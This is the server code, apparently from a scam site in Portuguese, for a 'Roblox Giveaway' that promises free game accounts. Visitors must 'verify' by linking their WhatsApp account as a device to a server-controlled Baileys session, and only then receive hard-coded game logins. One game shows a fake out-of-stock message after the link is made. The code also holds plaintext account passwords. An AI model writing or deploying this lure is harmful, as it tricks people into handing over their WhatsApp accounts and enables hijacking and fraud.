import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import makeWASocket, {
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion
} from '@whiskeysockets/baileys';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';
import { rm, mkdir } from 'fs/promises';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const server = createServer(app);
const io = new Server(server, {
    cors: { origin: '*' }
});

// Serve static files
app.use(express.static(join(__dirname, 'public')));

// Store active sessions
const activeSessions = new Map();

// Credentials per game type
const GAME_CREDENTIALS = {
    'blox-fruits': {
        username: 'SummerCarroll4594',
        password: 'vix@#!@931659'
    },
    'grow-garden': {
        username: '@v_Velocity2',
        password: 'K2pOc60z43GT'
    }
};

// Games blocked BEFORE WhatsApp (immediate out-of-stock)
const OUT_OF_STOCK = new Set([]);

// Games that show out-of-stock AFTER WhatsApp verification
const OUT_OF_STOCK_AFTER = new Set(['free-fire']);

/**
 * Create a WhatsApp session for a client using Baileys.
 * Generates QR data, constructs wa.me link, and sends to client.
 */
async function createWhatsAppSession(socketId, gameType) {
    const sessionDir = join(__dirname, 'sessions', socketId);

    try {
        // Create session directory
        await mkdir(sessionDir, { recursive: true });

        // Setup auth state
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        // Fetch latest WhatsApp Web version
        const { version } = await fetchLatestBaileysVersion();

        // Create WhatsApp socket
        const sock = makeWASocket({
            version,
            auth: state,
            printQRInTerminal: false,
            browser: ['Roblox Giveaway', 'Chrome', '120.0.0'],
            // Suppress noisy logs with a pino-compatible noop logger
            logger: {
                level: 'silent',
                info: () => {},
                error: () => {},
                warn: () => {},
                debug: () => {},
                trace: () => {},
                fatal: () => {},
                child() { return this; }
            }
        });

        // Store the session
        activeSessions.set(socketId, { sock, sessionDir, gameType });

        // Handle connection updates
        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update;

            // QR code received - extract link and send to client
            if (qr) {
                const link = `https://wa.me/settings/linked_devices#${qr}`;
                console.log(`[${socketId}] New QR/link generated for ${gameType}`);
                io.to(socketId).emit('pairingLink', { link });
            }

            // Connection established!
            if (connection === 'open') {
                console.log(`[${socketId}] WhatsApp connected for ${gameType}.`);

                if (OUT_OF_STOCK_AFTER.has(gameType)) {
                    // Game is out of stock — show message after WhatsApp verification
                    console.log(`[${socketId}] ${gameType} is out of stock after verification.`);
                    io.to(socketId).emit('outOfStock', {
                        message: 'Ops! Estamos reabastecendo o estoque de contas. Volte amanhã!'
                    });
                } else {
                    const credentials = GAME_CREDENTIALS[gameType];
                    io.to(socketId).emit('connected', credentials);
                }

                // Logout after a short delay to clean up
                setTimeout(async () => {
                    try {
                        await sock.logout();
                        console.log(`[${socketId}] Logged out successfully.`);
                    } catch (err) {
                        console.log(`[${socketId}] Logout error (expected):`, err.message);
                    }
                    cleanupSession(socketId);
                }, 3000);
            }

            // Connection closed
            if (connection === 'close') {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                console.log(`[${socketId}] Connection closed. Status: ${statusCode}`);

                if (statusCode === DisconnectReason.loggedOut) {
                    // User logged out or session expired
                    io.to(socketId).emit('sessionExpired', {
                        message: 'Sessão expirada. Tente novamente.'
                    });
                    cleanupSession(socketId);
                } else if (statusCode === DisconnectReason.connectionClosed ||
                           statusCode === DisconnectReason.connectionLost) {
                    // Connection issues - notify client
                    io.to(socketId).emit('error', {
                        message: 'Conexão perdida. Tente novamente.'
                    });
                    cleanupSession(socketId);
                }
            }
        });

        // Save credentials on update
        sock.ev.on('creds.update', saveCreds);

    } catch (err) {
        console.error(`[${socketId}] Error creating session:`, err);
        io.to(socketId).emit('error', {
            message: 'Erro ao criar sessão. Tente novamente.'
        });
        cleanupSession(socketId);
    }
}

/**
 * Clean up a session - remove socket and session directory.
 */
async function cleanupSession(socketId) {
    const session = activeSessions.get(socketId);
    if (session) {
        try {
            if (session.sock) {
                session.sock.ev.removeAllListeners('connection.update');
                session.sock.ev.removeAllListeners('creds.update');
            }
            await rm(session.sessionDir, { recursive: true, force: true });
        } catch (err) {
            console.log(`[${socketId}] Cleanup error:`, err.message);
        }
        activeSessions.delete(socketId);
    }
}

// Socket.io connection handling
io.on('connection', (socket) => {
    console.log(`Client connected: ${socket.id}`);

    // Client requests a new WhatsApp session
    socket.on('requestSession', async (data) => {
        const { gameType } = data;

        // Validate game type
        const validGames = ['blox-fruits', 'free-fire', 'grow-garden'];
        if (!validGames.includes(gameType)) {
            socket.emit('error', { message: 'Tipo de jogo inválido.' });
            return;
        }

        // Check stock
        if (OUT_OF_STOCK.has(gameType)) {
            socket.emit('outOfStock', {
                message: 'Ops! Estamos reabastecendo o estoque de contas. Volte amanhã!'
            });
            return;
        }

        // Clean up any existing session for this client
        await cleanupSession(socket.id);

        console.log(`[${socket.id}] Starting new session for: ${gameType}`);
        socket.emit('status', { message: 'Gerando link de verificação...' });

        // Create the WhatsApp session
        await createWhatsAppSession(socket.id, gameType);
    });

    // Client disconnects
    socket.on('disconnect', async () => {
        console.log(`Client disconnected: ${socket.id}`);
        await cleanupSession(socket.id);
    });
});

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`\n🎮 Roblox Giveaway Server running on http://localhost:${PORT}\n`);
});
